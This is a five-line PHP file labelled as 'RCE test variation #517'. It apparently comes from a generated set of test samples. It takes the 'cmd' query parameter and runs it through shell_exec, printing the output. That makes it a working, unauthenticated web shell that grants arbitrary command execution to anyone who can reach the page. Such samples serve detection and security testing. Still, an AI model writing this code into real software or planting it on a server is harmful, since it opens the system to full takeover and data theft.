<?php
// RCE test variation #517
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>